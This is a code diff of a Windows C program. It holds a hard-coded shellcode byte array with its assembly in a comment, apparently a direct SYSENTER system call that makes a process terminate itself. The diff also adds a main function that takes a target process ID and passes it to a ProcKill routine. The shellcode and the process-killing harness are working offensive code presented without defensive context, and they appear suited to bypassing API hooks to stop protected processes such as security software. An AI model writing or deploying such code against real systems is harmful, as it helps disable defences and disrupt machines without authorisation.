@@ -2,6 +2,19 @@
 #include <windows.h>
 
 
+/*
+    PUSH 0
+    PUSH -1
+    CALL 00193693
+    RET
+    TERM:
+    MOV EAX,101
+    CALL 0019369D
+    MOV EDX,ESP
+    SYSENTER
+    RET
+*/
+
 char shellcode[] = {
     "\x6A\x00\x6A\xFF\xE8\x01\x00\x00\x00\xC3\xB8\x01\x01\x00\x00\xE8\x00\x00\x00\x00\x8B\xD4\x0F\x34\xC3"
 };
@@ -29,24 +42,16 @@ void ProcKill(DWORD pid)
     CloseHandle(hProc);
 }
 
-int main(int argc, CHAR* argv[])
+int main(int argc, char** argv)
 {
-
-    DWORD shellcode_size = 0x20;
-    DWORD syscall_number_offset = 0x0B;
-
-    /*
-        PUSH 0
-        PUSH -1
-        CALL 00193693
-        RET
-        TERM:
-        MOV EAX,101
-        CALL 0019369D
-        MOV EDX,ESP
-        SYSENTER
-        RET
-    */
+    if (argc != 2)
+    {
+        printf("Usage: %s <pid>\n\n", argv[0]);
+        return 0;
+    }
+    
+    DWORD pid = atoi(argv[1]);
+    ProcKill(pid);
 
     return 0;
 }
